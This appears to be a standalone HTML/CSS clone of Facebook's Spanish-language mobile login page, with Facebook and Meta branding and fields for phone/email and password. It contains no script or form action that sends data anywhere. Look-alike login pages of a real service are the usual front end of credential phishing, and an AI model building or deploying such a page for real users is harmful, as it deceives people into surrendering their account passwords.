<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook - Iniciar sesión</title>
    <style>
        /* Reset de márgenes y paddings */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Configuración del cuerpo para cubrir toda la pantalla */
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #f7f8fc, #ffffff);
            height: 100vh; /* Ocupa toda la pantalla */
            width: 100vw;  /* Ocupa todo el ancho */
            display: flex;
            flex-direction: column;
            justify-content: center; /* Centra el contenido */
            align-items: center;
            text-align: center;
            position: relative;
            overflow: hidden; /* Evitar scroll */
        }

        /* Logo de Facebook */
        .logo {
            width: 60px;
            margin-bottom: 20px;
        }

        /* Contenedor principal */
        .container {
            width: 90%;
            max-width: 360px; /* Ancho fijo en móviles */
            position: absolute;
            top: 50%;
            transform: translateY(-50%); /* Centrado vertical */
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Campos de entrada */
        .input-box {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 16px;
            background: white;
            outline: none;
        }

        /* Botón de inicio de sesión */
        .login-button {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        /* Enlace de recuperación de contraseña */
        .forgot-password {
            display: block;
            margin: 12px 0;
            color: black;
            text-decoration: none;
            font-size: 14px;
        }

        /* Botón de crear cuenta */
        .create-account {
            width: 100%;
            padding: 14px;
            border: 1px solid #1877f2;
            background-color: white;
            color: #1877f2;
            font-weight: bold;
            border-radius: 20px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        /* Sección de Meta */
        .meta-section {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #606770;
            font-size: 14px;
            font-weight: bold;
            position: absolute;
            bottom: 50px;
        }

        .meta-icon {
            width: 20px;
            margin-right: 5px;
        }

        /* Pie de página */
        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 12px;
            color: #606770;
            text-align: center;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- Logo de Facebook -->
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">

    <!-- Contenedor de los elementos -->
    <div class="container">
        <!-- Campos de entrada -->
        <input type="text" class="input-box" placeholder="Celular o correo electrónico">
        <input type="password" class="input-box" placeholder="Contraseña">

        <!-- Botón de inicio de sesión -->
        <button class="login-button">Iniciar sesión</button>

        <!-- Enlace de recuperación de contraseña -->
        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>

        <!-- Botón de crear cuenta -->
        <button class="create-account">Crear cuenta nueva</button>
    </div>

    <!-- Sección de Meta con el icono -->
    <div class="meta-section">
        <img class="meta-icon" src="https://img.icons8.com/ios-filled/50/606770/meta.png" alt="Meta Icon">
        <span>Meta</span>
    </div>

    <!-- Pie de página -->
    <div class="footer">
        <a href="#">Información</a> |
        <a href="#">Ayuda</a> |
        <a href="#">Más</a>
    </div>

</body>
</html>
